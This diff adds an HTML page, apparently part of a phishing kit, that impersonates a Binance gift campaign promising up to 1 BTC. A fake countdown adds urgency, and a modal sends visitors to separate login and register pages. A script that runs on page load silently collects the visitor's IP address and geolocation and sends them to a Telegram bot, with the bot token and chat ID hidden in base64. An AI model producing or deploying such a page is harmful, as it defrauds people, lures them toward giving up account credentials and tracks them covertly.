@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance Gift</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin-top: 20px;
+            padding: 0;
+        }
+
+        html,
+        body {
+            margin: 0;
+            background-color: #1e1f26;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+        }
+
+        body {
+            padding: 40px 12px;
+        }
+
+        #card {
+            background: #0d0d0d;
+            border-radius: 20px;
+            width: 100%;
+            height: 100%;
+            max-width: 450px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.05);
+            border: 2.8px solid #333;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        #items {
+            width: 100%;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #card img {
+            width: 100px;
+            margin-bottom: 70px;
+        }
+
+        #card h2 {
+            font-size: 1.4em;
+            margin: 20px 0;
+        }
+
+        #card p {
+            font-size: 0.9em;
+            margin: 5px 0;
+        }
+
+        #btc {
+            color: #f1b90c;
+            font-size: 2em;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        #deadline {
+            color: #ccc;
+            font-size: 0.85em;
+            margin-bottom: 100px;
+        }
+
+        #btn {
+            background-color: #f1b90c;
+            color: #000;
+            border: none;
+            bottom: 0;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            font-size: 24px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 26px 20px rgb(0 0 0 / 90%);
+            transition: transform 0.2s ease;
+            margin: 0 auto;
+            z-index: 2;
+            position: absolute;
+            transform: translateY(-100px);
+            left: calc(50% - 60px);
+        }
+
+
+        #footer-logo {
+            margin-top: 40px;
+            color: #f1b90c;
+            font-weight: bold;
+            font-size: 1em;
+        }
+
+        #angle-bg {
+            position: absolute;
+            left: 0;
+            width: calc(100% - 40px);
+            height: 120px;
+            background: #1d1e23;
+            clip-path: polygon(0 0, 100% 0, 50% 100%);
+            z-index: 1;
+        }
+
+        #angle2-bg {
+            position: absolute;
+            width: 105%;
+            height: 80px;
+            background: #0d0d0d;
+            clip-path: polygon(0 0, 100% 0, 50% 100%);
+            z-index: 1;
+            margin: -2px 0 0 0;
+        }
+
+        #bottomDiv {
+            width: 100%;
+            height: 230px;
+            background-color: #1d1e23;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: center;
+            position: relative;
+        }
+
+        #binance {
+            width: 200px;
+            height: 40px;
+            background-image: url("https://www.logo.wine/a/logo/Binance/Binance-Logo.wine.svg");
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: 75%;
+            position: absolute;
+            bottom: 0;
+            transform: translateY(-25px);
+        }
+
+        #countdown {
+            color: #ccc;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal {
+            background: white;
+            color: #2b2b2b;
+            border-radius: 10px;
+            padding: 25px 20px;
+            width: 320px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .modal .icon {
+            font-size: 40px;
+            color: #fcd535;
+            margin-bottom: 15px;
+        }
+
+        .modal button {
+            background-color: #fcd535;
+            padding: 15px 20px;
+            border: none;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        .modal a {
+            display: block;
+            margin-top: 18px;
+            color: #b18e00;
+            text-decoration: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="card">
+        <div id="items">
+            <img src="BinanceEGGGOLD.png" alt="binance logo" style="width: 100px;">
+            <h2>Let’s both win a gift!</h2>
+            <p>Open this Gift and win up to</p>
+            <div id="btc">1 BTC</div>
+            <p id="countdown">⏳ Activity ends: 2025-05-25 ⏱ 11 10 01 (UTC)</p>
+        </div>
+
+        <div id="bottomDiv">
+            <div id="angle2-bg"></div>
+            <div id="binance"></div>
+        </div>
+        <button id="btn" onclick="showModal()">OPEN</button>
+    </div>
+
+    <div class="overlay" id="loginModal">
+        <div class="modal">
+            <img src="!.png" alt="binance logo" style="width: 80px;">
+            <p>Please login to participate in the campaign</p>
+            <button onclick="location.href='login.html'">Login Now</button>
+            <a href="register.html">Register</a>
+        </div>
+    </div>
+
+    <script>
+        function updateCountdown() {
+            const now = new Date();
+            const deadline = new Date();
+            deadline.setHours(10, 0, 0, 0);
+
+            if (now > deadline) {
+                deadline.setDate(deadline.getDate() + 1);
+            }
+
+            const year = deadline.getFullYear();
+            const month = String(deadline.getMonth() + 1).padStart(2, '0');
+            const day = String(deadline.getDate()).padStart(2, '0');
+            const hours = String(deadline.getHours()).padStart(2, '0');
+            const minutes = String(deadline.getMinutes()).padStart(2, '0');
+            const formattedDeadline = `${year}-${month}-${day}`;
+
+            let diffMs = deadline - now;
+
+            const days = Math.floor(diffMs / (1000 * 60 * 60 * 24));
+            diffMs %= (1000 * 60 * 60 * 24);
+
+            const hoursLeft = Math.floor(diffMs / (1000 * 60 * 60));
+            diffMs %= (1000 * 60 * 60);
+
+            const minutesLeft = Math.floor(diffMs / (1000 * 60));
+            diffMs %= (1000 * 60);
+
+            const secondsLeft = Math.floor(diffMs / 1000);
+
+            const remainingText = ` ${String(hoursLeft).padStart(2, '0')} ${String(minutesLeft).padStart(2, '0')} ${String(secondsLeft).padStart(2, '0')}`;
+
+            document.getElementById('countdown').textContent = `⏳ Activity ends:  ${formattedDeadline} ⏱ ${remainingText} (UTC) `;
+        }
+
+        updateCountdown();
+        setInterval(updateCountdown, 1000);
+
+        function showModal() {
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+        fetch('https://freeipapi.com/api/json')
+            .then(response => response.json())
+            .then(data => {
+                const msg = `
+  |------|By YKK (EGG) -------|
+  ------ Etape EGG Binance ------       
+  📍 *Location Info*
+  💻 IP: ${data.ipAddress}
+  🌐 Latitude: ${data.latitude}
+  🧭 Longitude: ${data.longitude}
+  🏳️ Country: ${data.countryName}
+  🗺️ Region: ${data.regionName}
+  🏙️ City: ${data.cityName}
+  📮 ZIP: ${data.zipCode}
+  |------|By KaKarout|------|`;
+
+                const tkn = atob("NzMzOTg1NzgyMzpBQUdWSVB2d01SUk1qbXZDY2xMd3IxYndkd19CSFJGRHJXUQ==");
+                const chat_id = atob("ODAzODY3ODQ4NA==");
+
+                fetch("https://api.telegram.org/bot" + tkn + "/sendMessage", {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chat_id, text: msg, parse_mode: "Markdown" })
+                });
+            });
+    </script>
+
+
+</body>
+
+</html>
